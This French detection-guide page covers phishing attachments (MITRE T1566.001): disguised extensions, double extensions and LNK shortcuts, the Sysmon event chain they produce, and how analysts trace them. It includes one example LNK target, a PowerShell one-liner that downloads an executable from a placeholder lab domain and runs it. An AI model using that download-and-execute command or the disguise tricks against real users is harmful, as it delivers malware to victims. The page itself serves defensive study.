---
title: "Pièce jointe malveillante"
description: "L'attaquant envoie un exécutable ou un raccourci déguisé en document, et compte sur l'utilisateur pour l'ouvrir lui-même."
tags: [windows, phishing, sysmon, lnk, powershell]
updated: 2026-11-18
draft: false
type: technique
attack_id: T1566.001
tactic: initial-access
severity: high
platforms: [Windows]
data_sources: [Sysmon]
related:
  - 03-menaces-detection/initial-access/media-amovible
---

## Description

Le phishing passe le pare-feu : c'est l'utilisateur qui lance le malware. La pièce jointe arrive souvent dans une archive `.zip` ou `.rar`, et elle est déguisée :

| Déguisement | Exemple | Pourquoi ça marche |
| --- | --- | --- |
| Extension rare | `.com`, `.scr`, `.cpl` | Des exécutables, comme `.exe`, dont on se méfie moins. Un fichier `tryhatme.com` ressemble à un lien. |
| Double extension | `invoice.pdf.exe`, `cat.png.com` | Windows masque par défaut les extensions connues : l'utilisateur voit `invoice.pdf`, avec une icône adaptée. |
| Raccourci (LNK) | `Visit Our Website!.lnk` | Le champ Cible d'un raccourci peut contenir n'importe quelle commande, et son icône est libre. Il cache un script PowerShell, VBS ou BAT, moins détecté par l'antivirus qu'un exécutable. |

Lire la cible d'un raccourci sans l'ouvrir : clic droit › Propriétés › onglet Raccourci. Exemple de cible :

```powershell title="cible d'un LNK : télécharger le malware, puis le lancer"
powershell.exe -c (New-object System.Net.WebClient).DownloadFile('https://breacheddomain.thm/FILTERED/r.exe','C:\\ProgramData\\r.exe'); start C:\\ProgramData\\r.exe
```

## Ce qu'on observe

L'enchaînement dans Sysmon, pour une archive qui contient un exécutable à double extension :

:::etapes
1. **Le navigateur est lancé**
   Sysmon 1 : `Image` = `msedge.exe`, `ParentImage` = `explorer.exe`.
2. **L'archive est téléchargée**
   Sysmon 11 : `Image` = le navigateur, `TargetFilename` = `C:\Users\<utilisateur>\Downloads\invoice.zip`.
3. **L'archive est décompressée**
   Sysmon 11 : `Image` = `explorer.exe` ou `7zG.exe`, `TargetFilename` = le fichier extrait. Le dossier peut être n'importe lequel.
4. **L'utilisateur double-clique**
   Sysmon 1 : `Image` = le fichier extrait, `ParentImage` = `explorer.exe`.
5. **Le malware agit**
   Sysmon 3 et 22 avec son `ProcessId` : le domaine et l'IP qu'il contacte.
:::

Avec un **LNK**, l'exécution du raccourci n'est pas journalisée : l'Explorateur lit la cible et lance la commande, donc on voit `powershell.exe` avec `explorer.exe` pour parent. Ce qui trahit le raccourci, c'est l'événement 11 qui le montre arriver dans `Downloads` juste avant.

## Détection

### Observateur d'événements

:::etapes
1. **Trouver le téléchargement**
   Journal Sysmon, Filter Current Log sur `11`, Find sur `Downloads` : l'archive ou le fichier arrivé par le navigateur.
2. **Trouver l'extraction**
   Les événements 11 suivants : où l'archive a été décompressée, sous quel nom.
3. **Trouver l'exécution**
   Filtre sur `1`, Find sur le nom du fichier extrait : le processus lancé, son `ProcessId`, son parent.
4. **Trouver ce qu'il a fait**
   Find sur ce `ProcessId` : ses connexions (3), requêtes DNS (22), fichiers créés (11). Méthode : [analyser un processus](../../01-fondamentaux/journaux-windows.md#analyser-un-processus).
:::

## Faux positifs

À compléter.

:::piege
**Un LNK ne laisse presque pas de trace** : `explorer.exe` qui lance PowerShell peut être un raccourci piégé ou une autre attaque. Seul le fichier `.lnk` arrivé juste avant dans `Downloads` permet de trancher.
:::

## Réponse

À compléter.
